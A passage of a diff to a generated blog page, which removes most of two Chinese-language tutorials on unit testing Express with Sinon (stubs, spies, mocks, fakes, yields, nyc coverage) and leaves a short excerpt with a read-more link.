class="line">    <span class="built_in">console</span>.log(data);</span><br><span class="line">&#125;</span><br><span class="line">main()</span><br><span class="line"><span class="comment">// qqqq</span></span><br></pre></td></tr></table></figure></p>
-<p>在這種 callback 底下，可以透過 <code>sinon.yields</code> 去進行測試<br>
-<code>sinon.yields</code> 的功能，就是可以強制讓你的 callback 被執行<br>
-而不會去執行原本 function 內 callback 應該要執行的內容<br>
-而且後面所帶的參數會變成你設定在 <code>yields(data1, data2)</code> 後面的 data1 data2<br>
-這邊展示一個範例
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">    test: <span class="function"><span class="keyword">function</span>(<span class="params">data, callback</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"running"</span>);</span><br><span class="line">        callback(data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">obj.test(<span class="string">"test"</span>, (data) =&gt; &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(data);</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// running</span></span><br><span class="line"><span class="comment">// test</span></span><br></pre></td></tr></table></figure></p>
-<p>讓我們把程式加上 <code>sinon.yield</code> 試試看
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> sinon = <span class="built_in">require</span>(<span class="string">"sinon"</span>)</span><br><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">    test: <span class="function"><span class="keyword">function</span>(<span class="params">data, callback</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"running"</span>);</span><br><span class="line">        callback(data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">sinon.stub(obj, <span class="string">"test"</span>).yields(<span class="number">1</span>)</span><br><span class="line">obj.test(<span class="string">"test"</span>, (data) =&gt; &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(data);</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// 1</span></span><br></pre></td></tr></table></figure></p>
-<p>程式會 log 出 1 這個值<br>
-但是 running 並不會執行到<br>
-非常符合 stub 的原則，就是會覆寫 function 原本的行為<br>
-然後再透過 yields 的方法，可以直接你所撰寫觸發 callback 的行為<br>
-而不會去執行 obj.test function 本身的行為</p>
-<p>所以依此類推，我在後面多加幾個參數<br>
-原本的 callback 回來的參數只會有一個，其餘為 <code>undefined</code><br>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">    test: <span class="function"><span class="keyword">function</span>(<span class="params">data, callback</span>) </span>&#123;</span><br><span class="line">        callback(data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">obj.test(<span class="string">"test"</span>, (data1, data2, data3) =&gt; &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"data1: "</span> + data1);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"data2: "</span> + data2);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"data3: "</span> + data3);</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// data1: test</span></span><br><span class="line"><span class="comment">// data2: undefined</span></span><br><span class="line"><span class="comment">// data3: undefined</span></span><br></pre></td></tr></table></figure></p>
-<p>但是如果透過 <code>sinon.yields</code> 去強制給於另外兩個參數呢?<br>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> sinon = <span class="built_in">require</span>(<span class="string">"sinon"</span>)</span><br><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">    test: <span class="function"><span class="keyword">function</span>(<span class="params">data, callback</span>) </span>&#123;</span><br><span class="line">        callback(data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">sinon.stub(obj, <span class="string">"test"</span>).yields(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">obj.test(<span class="string">"test"</span>, (data1, data2, data3) =&gt; &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"data1: "</span> + data1);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"data2: "</span> + data2);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"data3: "</span> + data3);</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// data1: 1</span></span><br><span class="line"><span class="comment">// data2: 2</span></span><br><span class="line"><span class="comment">// data3: 3</span></span><br></pre></td></tr></table></figure></p>
-<p>callback 的時候，另外兩個參數也會跟著進來</p>
-<p>那透過把 callback 包成 promise 的案例又該怎麼測試呢?<br>
-範例如下，必須在執行 function 之前<br>
-先加上 <code>sinon.stub(obj, &quot;test&quot;).yields(1)</code> 就可以了
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> sinon = <span class="built_in">require</span>(<span class="string">"sinon"</span>)</span><br><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">    test: <span class="function"><span class="keyword">function</span>(<span class="params">data, callback</span>) </span>&#123;</span><br><span class="line">        callback(data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">sinon.stub(obj, <span class="string">"test"</span>).yields(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">const</span> test = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">res, rej</span>) =&gt;</span> &#123;</span><br><span class="line">        obj.test(<span class="string">"qqqq"</span>, (data) =&gt; &#123;</span><br><span class="line">            res(data)</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> data = <span class="keyword">await</span> test();</span><br><span class="line">    <span class="built_in">console</span>.log(data);</span><br><span class="line">&#125;</span><br><span class="line">main()</span><br><span class="line"><span class="comment">// 1 (因為已經被 yields 改成 1 了)</span></span><br></pre></td></tr></table></figure></p>
-<h2><span id="測試涵蓋率-test-coverage">測試涵蓋率 (test coverage)</span></h2>
-<p>做測試的時候當然少不了 test coverage<br>
-node.js 有一款叫做 nyc 的可以檢測 test coverage<br>
-配製方法非常簡單，以下兩個步驟即可</p>
-<ol>
-<li>下載 nyc <code>npm install nyc</code></li>
-<li>把 nyc 放置於 mocha 前面 <code>nyc mocha ....</code><br>
-如果要想看 html 結構的報告的話，<code>nyc --reporter=lcov --reporter=text-summary mocha ...</code></li>
-</ol>
-<p><img src="/images/unit-test/nyc.png" alt></p>
-<blockquote>
-<p>可在<a href="https://github.com/Yu-Jack/unit-test-practice">個人專案</a>下執行 <code>npm run nyc</code> 即可看到結果</p>
-</blockquote>
-<h2><span id="結語">結語</span></h2>
-<p>以上介紹幾個在實際撰寫 unit test 會遇到的困難點以及解決方法<br>
-未來還有遇到的話，會在陸陸續續補上來！</p>
-
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><a href="https://yu-jack.github.io/2019/12/10/unit-test-express/">上一篇</a>我們講到使用 sinon 搭配 express 的使用基礎<br>今天會介紹的是關於在 express 上<br>實作 unit test 的幾個技巧以及可能會遇到的問題<br>該如何解決問題，並依靠 sinon 去達到希望的功效  </p>
         </div>
         
+        
+        <div class="level is-mobile">
+            <div class="level-start">
+                <div class="level-item">
+                <a class="button is-size-7 is-light" href="/2019/12/22/unit-test-express-implement-troubleshooting/#more">繼續閱讀</a>
+                </div>
+            </div>
+        </div>
         
         
     </div>
@@ -556,217 +369,18 @@ node.js 有一款叫做 nyc 的可以檢測 test coverage<br>
             
         </h1>
         <div class="content">
-            <h2><span id="前言">前言</span></h2>
-<p>&lt;span style=&quot;color:green&quot;&gt;[2019-12-22 Update]&lt;/span&gt;
-在<a href="https://yu-jack.github.io/2019/12/22/unit-test-express-implement-troubleshooting/">express unit test 一些技巧教學以及困難點</a>裡面有針對一些技巧做說明<br>
-以及增加測試涵蓋率的使用方式</p>
-<p>在很久很久之前有提到過 <a href="https://yu-jack.github.io/2017/11/01/how-to-test/">unit test</a><br>
-但那時候只有針對簡單到不能在簡單的 function 進行 unit test<br>
-想必大家一定也不太了解 unit test 究竟要怎麼用在真正開發上面</p>
-<p>&lt;!-- more --&gt;</p>
-<p>在真正開發上面要用到 unit test<br>
-一定會牽扯到讀取資料庫、讀取檔案、呼叫 API 等等複雜邏輯<br>
-難道在做測試的時候，我還要確保我的 API 可以呼叫<br>
-資料庫可以進行連線等等後，我才能確認我的程式是否正確嗎?<br>
-在這種情況下要做 unit test 真的是一件不簡單的事情<br>
-更別說 test cases 跑到一半<br>
-有人把你測試環境的 database 亂改動，或是 API  Server 的分支改掉這種鳥事了...</p>
-<p>這樣的話，究竟要透過什麼樣的方式可以去做到 unit test 呢?<br>
-其實可以透過 mock 的機制，讓呼叫 API 回傳值<br>
-回傳一個固定值，而並不需要去真正呼叫 API</p>
-<p>這裡所說的 mock 只是 unit test 使用到的一種方式<br>
-其他還包含 spy 、stub、fake 等等
-我們通常稱這些為 test double (測試替身)
-以下會先介紹剛剛提到的 test double</p>
-<blockquote>
-<p>題外話，一開始看到這名詞讓我一直想到 JOJO ..</p>
-</blockquote>
-<h2><span id="test-double-測試替身">Test Double - 測試替身</span></h2>
-<p>根據<a href="http://teddy-chen-tw.blogspot.com/2014/09/test-double2.html">搞笑談軟功</a>裡面其實有提到五種，但我這邊會介紹個人常見和常用到的四種</p>
-<h3><span id="stub">stub</span></h3>
-<p>當程式是使用到 HTTP 相關操作的，為了測試相依性降到最低
-可以透過 stub 去變更發出 HTTP 程式的行為，變成不真的發出 HTTP，且可以自定義回傳的結果
-還有包含讀檔的行為也是如此，利用 stub 取代真的讀檔的行為，使測試可以更關注在程式邏輯上面
-而一般使用 stub 都會寫死回傳的資訊，以方便後續測試</p>
-<p>使用情景: &lt;span style=&quot;color:green&quot;&gt;[假資料回傳]&lt;/span&gt;<br>
-HTTP Request, 讀檔, 讀取資料庫等等，後續程式還沒實作的狀況下可以用來測試程式邏輯</p>
-<h3><span id="spy">spy</span></h3>
-<p>此 double 是用在去紀錄 function 的行為驗證上面
-被 spy 的 function 就像是被安插間諜一樣，會去收集行為
-function 也會真的被執行，並不會像 stub 一樣被取代掉
-以 function 裡面 post http 為例，此 post http 是會真的發送請求出去，但會被紀錄
-如果是用 stub 的話，post http 則是不會發送請求出去</p>
-<p>使用情景: &lt;span style=&quot;color:green&quot;&gt;[行為驗證]&lt;/span&gt;<br>
-因為程式是真的會執行，所以會專注在驗證程式執行的行為驗證上，例如驗證程式應該只能跑一次等等的行為上</p>
-<p>想了解更詳細的可以讀讀 Sinon.js 的文件內容，擷取部分原文如下</p>
-<blockquote>
-<p>A test spy is a function that records arguments, return value, the
-value of this and exception thrown (if any) for all its calls.
-from <a href="https://sinonjs.org/releases/latest/spies/">Sinon Spy</a></p>
-</blockquote>
-<h3><span id="mock">mock</span></h3>
-<p>Mock Object 則是類似於 spy 以及 stub 的集合體
-本身擁有可以取代物件的方法 (stub)，且內建 expect 方法可以驗證執行的行為是否正確 (spy)
-如果只是單純要讓後續程式邏輯接受固定值的話，用 stub 即可
-如果只是單純要驗證程式的行為，用 spy 即可
-但如果是以上兩個混合的狀況下，則是建議使用 Mock</p>
-<p>使用情景: &lt;span style=&quot;color:green&quot;&gt;[行為驗證,假資料回傳]&lt;/span&gt;<br>
-當需要驗證 HTTP POST 是否有根據所需參數進行執行，但又不想要真的發出 HTTP 的時候可以使用，跟 spy 最大差別在於 spy 是會真的執行程式，但 Mock 是不會真的去執行</p>
-<p>想了解更詳細的可以讀讀 Sinon.js 的文件內容，擷取部分原文如下</p>
-<blockquote>
-<p>Mocks (and mock expectations) are fake methods (like spies) with pre-programmed behavior (like stubs) as well as pre-programmed expectations.
-Mocks should only be used for the method under test. In every unit test, there should be one unit under test.
-In general you should have no more than one mock (possibly with several expectations) in a single test.
-from <a href="https://sinonjs.org/releases/latest/mocks/">Sinon Mock</a></p>
-</blockquote>
-<h3><span id="fake">fake</span></h3>
-<p>此物件並不像是 spy 或是 stub 會取代程式裡面的行為
-而是建立一個實際可執行的 function，通常是用在建立 XHR or Server or Database 上面，但會是以更簡化的方式去實現
-例如原本可能是一個寄信的程式，但因為寄信驗證這件事情本身不好處理
-這邊可以做出一個 fake Object 是把寄信的訊息內容，改成寫檔，已達成寄信行為的驗證</p>
-<p>使用情境：&lt;span style=&quot;color:green&quot;&gt;[簡化程式]&lt;/span&gt;<br>
-簡化寄信，或是簡化 DB 連線改用 In-memory 的方式等等，目的就是要簡化 prodcution code 的複雜度</p>
-<p>想了解更詳細的可以讀讀 Sinon.js 的文件內容，擷取部分原文如下</p>
-<blockquote>
-<p>the sinon.fake API knows only how to create fakes, and doesn’t concern itself with plugging them into the system under test.
-To plug the fakes into the system under test, you can use the sinon.replace* methods.
-from <a href="https://sinonjs.org/releases/latest/fakes/">Sinon Fake</a></p>
-</blockquote>
-<h3><span id="小結結語">小結結語</span></h3>
-<p>要特別注意一件事情<br>
-每一個測試框架針對這些 test double 可能會有一些些微的差距<br>
-最好是針對測試框架裡面的文件進行閱讀<br>
-去了解使用時機跟方式會比較恰當<br>
-接下來就開始介紹關於 Sinon 這個測試框架的程式實作部分<br>
-以及該如何搭配 express 進行 unit test</p>
-<h2><span id="實作">實作</span></h2>
-<p>接下來會透過 express 搭配 sinon 進行 unit test 的說明<br>
-首先我們會需要一個簡單的 express server<br>
-此 server 功能有呼叫登入 API 以及寫檔兩種功能</p>
-<p>為了方便進行 unit test 程式架構上，會進行拆分以模擬真實開發狀況<br>
-登入的主要邏輯很單純<br>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// server.js - listen 在 7070</span></span><br><span class="line"><span class="keyword">const</span> authController = <span class="built_in">require</span>(<span class="string">"./authController"</span>)</span><br><span class="line">app.post(<span class="string">"/login"</span>, authController.run);</span><br><span class="line"></span><br><span class="line"><span class="comment">// authController.js</span></span><br><span class="line"><span class="keyword">const</span> run = <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123;</span><br><span class="line">        username</span><br><span class="line">    &#125; = &#123;...req.body&#125;;</span><br><span class="line">    <span class="keyword">const</span> result = <span class="keyword">await</span> apiService.login(username)</span><br><span class="line">    <span class="keyword">if</span> (result.status !== <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.json(&#123;</span><br><span class="line">            message: <span class="string">"登入失敗"</span></span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res.json(&#123;</span><br><span class="line">        message: <span class="string">"登入成功"</span></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// apiService.js</span></span><br><span class="line"><span class="keyword">const</span> login = <span class="function">(<span class="params">username</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> axios.post(<span class="string">"http://localhost:7070/api"</span>, &#123;</span><br><span class="line">        username,</span><br><span class="line">    &#125;).then(<span class="function">(<span class="params">res</span>) =&gt;</span> res.data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 給 /login 用的, 不在測試範圍內</span></span><br><span class="line">app.post(<span class="string">"/api"</span>, (req, res) =&gt; &#123;</span><br><span class="line">    res.json(&#123;<span class="attr">status</span>: req.body.username === <span class="string">"123"</span> ? <span class="number">0</span> : <span class="number">1</span>&#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p>
-<p>在這種情況下要進行 unit test 必須要確保<br>
-呼叫 <code>apiService.login</code> 是不會有任何問題的<br>
-那如果要移除這層依賴，透過 test double 該如何對 <code>authController.run</code> 進行測試呢?</p>
-<h3><span id="express-with-sinon-stub">Express with Sinon Stub</span></h3>
-<h4><span id="sinon-stub-介紹">Sinon Stub 介紹</span></h4>
-<p>先介紹一下 Sinon Stub 如何使用，先看 code</p>
-<p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> sinon = <span class="built_in">require</span>(<span class="string">"sinon"</span>);</span><br><span class="line"><span class="keyword">const</span> test = sinon.stub().returns(<span class="number">5</span>);</span><br><span class="line"><span class="built_in">console</span>.log(test());</span><br><span class="line"><span class="comment">// 5</span></span><br></pre></td></tr></table></figure>
-透過 stub 這個 function 接到的回傳值會是一個 function<br>
-而這個 function 可以自定義呼叫的時候會有什麼樣的行為<br>
-上面的範例中，我們讓他呼叫後得到的回傳是 5</p>
-<p>那如果要得到類似 <code>{status: 0}</code> 這種結果呢? 方法如下<br>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> test = sinon.stub().returns(&#123;<span class="attr">status</span>: <span class="number">0</span>&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(test());</span><br><span class="line"><span class="comment">// &#123;status: 0&#125;</span></span><br></pre></td></tr></table></figure></p>
-<p>那如果說是要取代原本 function 的功能呢?
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> sinon = <span class="built_in">require</span>(<span class="string">"sinon"</span>);</span><br><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">    test: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"this is test."</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(obj.test());</span><br><span class="line"><span class="comment">// "this is test."</span></span><br><span class="line">sinon.stub(obj, <span class="string">"test"</span>).resolves(&#123;<span class="attr">status</span>: <span class="number">0</span>&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(obj.test());</span><br><span class="line"><span class="comment">// Promise &#123; &#123; status: 0 &#125; &#125;</span></span><br></pre></td></tr></table></figure></p>
-<p>透過以上方法，obj 裡面的 test function 就被取代掉<br>
-然後讓這個 function 回傳一個 promise.resolve 的結果</p>
-<p>但如果說我的 function 要接收一個參數，然後指定回傳呢?<br>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> sinon = <span class="built_in">require</span>(<span class="string">"sinon"</span>);</span><br><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">    test: <span class="function"><span class="keyword">function</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"this is test: "</span> + a</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(obj.test(<span class="string">"test"</span>));</span><br><span class="line"><span class="comment">// this is test: test</span></span><br><span class="line">sinon.stub(obj, <span class="string">"test"</span>).withArgs(<span class="string">"123"</span>).returns(&#123;<span class="attr">status</span>: <span class="number">0</span>&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(obj.test(<span class="string">"123"</span>));</span><br><span class="line"><span class="comment">// &#123; status: 0 &#125;</span></span><br><span class="line"><span class="built_in">console</span>.log(obj.test());</span><br><span class="line"><span class="comment">// undefined</span></span><br></pre></td></tr></table></figure></p>
-<p>透過 <code>withArgs</code> 可以設定，當這個 function 接收到什麼樣的參數的時候<br>
-應該要回傳什麼樣的結果<br>
-以上面的範例來說，只要這個 test function 的參數是 <code>&quot;123&quot;</code> 的話<br>
-那他的回傳值就會是 <code>{ status: 0 }</code><br>
-綜合以上的方法，就可以開始實作 unit test 了</p>
-<h4><span id="如何在-express-上使用-stub">如何在 express 上使用 stub</span></h4>
-<p>回到正題
-因為是 express 的關係，所以 req 以及 res 的物件必須先透過 stub<br>
-把 res 的行為先透過自訂義的方式給取代</p>
-<blockquote>
-<p>這邊 req 不用的原因是，我們只取 req.body 的值
-所以可以直接當成 json 取值就好
-但 res 不能的原因是, express 再回傳的時候
-會需要多 call res.json() 來把值回傳回去</p>
-</blockquote>
-<p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> mockRequest = <span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        body: data</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> mockResponse = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> res = &#123;&#125;;</span><br><span class="line">    res.json = sinon.stub().returns(res);</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>接下來正式的測試程式來了<br>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">describe(<span class="string">"[登入功能]"</span>, () =&gt; &#123;</span><br><span class="line">    it(<span class="string">"登入成功"</span>, <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> req = mockRequest(&#123;</span><br><span class="line">            username: <span class="string">"123"</span>,</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">const</span> res = mockResponse();</span><br><span class="line">        sinon.stub(apiService, <span class="string">"login"</span>).withArgs(<span class="string">"123"</span>).resolves(&#123;</span><br><span class="line">            status: <span class="number">0</span></span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">await</span> authController.run(req, res)</span><br><span class="line">        sinon.assert.calledWith(res.json, &#123;</span><br><span class="line">            message: <span class="string">"登入成功"</span>,</span><br><span class="line">        &#125;);</span><br><span class="line">        sinon.assert.calledOnce(res.json);</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p>
-<p>透過使用 <code>sinon.stub(apiService, &quot;login&quot;)</code><br>
-可以把 apiService 裡面的 login function 實際行為給取消掉<br>
-我們在後面定義了回傳一個 <code>Promise.resolve</code> 來指定被我們更改掉後應該回傳的資料<br>
-也就是 <code>sinon.stub(apiService, &quot;login&quot;).resolves(data)</code> 裡面的 data<br>
-這樣我們就可以讓 <code>authController.run</code> 裡面的 <code>apiService.login</code><br>
-不會真正去發送 POST Request，而是會回傳我們的結果<br>
-執行 mocha 後的結果如下<br>
-<img src="/images/unit-test/mocha-1.png" alt></p>
-<p>接下來我們再增加一個 test case，程式碼如下<br>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> apiServiceLogin = sinon.stub(apiService, <span class="string">"login"</span>)</span><br><span class="line">describe(<span class="string">"[登入功能]"</span>, () =&gt; &#123;</span><br><span class="line">    beforeEach(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        apiServiceLogin.reset()</span><br><span class="line">    &#125;)</span><br><span class="line">    it(<span class="string">"登入成功"</span>, <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> req = mockRequest(&#123;</span><br><span class="line">            username: <span class="string">"123"</span>,</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">const</span> res = mockResponse();</span><br><span class="line">        apiServiceLogin.withArgs(<span class="string">"123"</span>).resolves(&#123;</span><br><span class="line">            status: <span class="number">0</span></span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">await</span> authController.run(req, res)</span><br><span class="line">        sinon.assert.calledWith(res.json, &#123;</span><br><span class="line">            message: <span class="string">"登入成功"</span>,</span><br><span class="line">        &#125;);</span><br><span class="line">        sinon.assert.calledOnce(res.json);</span><br><span class="line">    &#125;)</span><br><span class="line">    it(<span class="string">"登入錯誤"</span>, <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> req = mockRequest(&#123;</span><br><span class="line">            username: <span class="string">"123"</span>,</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">const</span> res = mockResponse();</span><br><span class="line">        apiServiceLogin.withArgs(<span class="string">"123"</span>).resolves(&#123;</span><br><span class="line">            status: <span class="number">999</span></span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">await</span> authController.run(req, res)</span><br><span class="line">        sinon.assert.calledWith(res.json, &#123;</span><br><span class="line">            message: <span class="string">"登入失敗"</span>,</span><br><span class="line">        &#125;);</span><br><span class="line">        sinon.assert.calledOnce(res.json);</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p>
-<p>這邊要注意，已經被取代掉的 function，行為已經被我們第一個 test case 給固定了<br>
-為了要還原預設行為，必須在 <code>beforeEach</code> 加上  <code>reset()</code> 的方法<br>
-去重置每一個 test case <code>apiService.login</code> 回傳的行為，結果如下<br>
-<img src="/images/unit-test/mocha-2.png" alt></p>
-<h3><span id="express-with-sinon-spy">Express with Sinon Spy</span></h3>
-<h4><span id="sinon-spy">Sinon Spy</span></h4>
